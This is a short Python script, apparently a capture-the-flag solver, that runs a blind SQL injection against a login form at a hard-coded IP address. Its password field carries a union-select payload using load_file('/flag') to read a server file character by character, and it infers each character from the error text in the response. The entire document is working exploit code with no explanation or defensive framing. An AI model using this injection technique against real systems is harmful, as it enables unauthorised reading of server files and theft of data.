import requests

session = requests.Session()

# 通过 load 文件的方式，盲注 flag
# flag 可能的字符内容
tables = '{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

web_url = "http://103.213.97.75:51448"

flag = ""

# 假设 flag 长度小于43
for i in range(1, 43):
    for j in tables:
        blind_data = {
            "username": "admin",
            "password": f"' union select 1 where if(mid((select load_file('/flag')), {str(i)}, 1) in ('{j}'), 1,0)#"
        }

        r = session.post(web_url, data=blind_data)

        # print(r.text)

        if "something wrong" in r.text:
            # print(blind_data)
            continue
        elif "wrong password" in r.text:
            flag += j
            print(flag)
            